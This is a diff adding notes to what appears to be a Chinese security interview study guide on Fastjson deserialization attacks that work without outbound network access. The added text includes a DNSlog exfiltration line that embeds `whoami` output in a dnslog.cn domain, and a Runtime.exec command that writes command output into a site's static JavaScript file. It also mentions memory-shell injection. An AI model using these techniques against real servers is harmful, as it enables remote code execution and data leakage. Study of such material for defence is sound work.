@@ -38,11 +38,36 @@
 
 ### 是否存在不出网的Fastjson利用方式（★★★）
 
-第一种是`TemplatesImpl`类加载字节码做到不出网利用，但需要开启特殊参数实战鸡肋
+第一种是`TemplatesImpl`类加载字节码做到不出网利用，但需要开启特殊参数(`Feature.SupportNonPublicField`)实战鸡肋. (分为命令执行和内存马)
 
-第二种方式是服务端存在在`tomcat-dbcp.jar`情况下，使用`BasicDataSource`配合`BCEL`可实现不出网`RCE`
+- 如何让它有回显：
 
+  - dnslog外带:	
 
+    ```md
+    `whoami`.xxxxxx.dnslog.cn
+    ```
+
+  - 静态资源写⽂件:
+
+    假设已经知道⽹站路径，拼接路径为：
+
+    ```md
+    /root/java_vuln_code-master/src/main/resources/static/js/consoleinfo.js
+    ```
+
+    则命令参数这么写:
+
+    ```java
+    Runtime.getRuntime().exec("whoami >> /root/java_vuln_code-
+    master/src/main/resources/static/js/consoleinfo.js");
+    ```
+
+    
+
+第二种方式是服务端存在在`tomcat-dbcp.jar`情况下，使用`BasicDataSource`配合`BCEL`可实现不出网`RCE` (同样能通过此方式写内存马)	——[浅析FastJson不出网利用方式](https://forum.butian.net/share/2040)
+
+​											
 
 ### 谈谈1.2.47版本之前各个小版本的绕过（★★★）[+]
 
